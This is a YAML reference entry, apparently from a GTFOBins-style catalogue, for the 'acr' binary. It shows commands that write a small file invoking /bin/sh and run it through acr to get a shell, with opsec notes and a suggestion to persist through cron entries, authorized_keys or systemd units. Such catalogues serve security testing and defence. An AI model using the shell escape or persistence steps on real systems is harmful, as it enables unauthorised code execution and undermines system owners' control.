---
name: acr
capabilities:
- exec
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
    chmod +x /path/to/temp-file
    acr -r ./relative/path/to/temp-file
references:
- https://gtfobins.github.io/gtfobins/acr/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
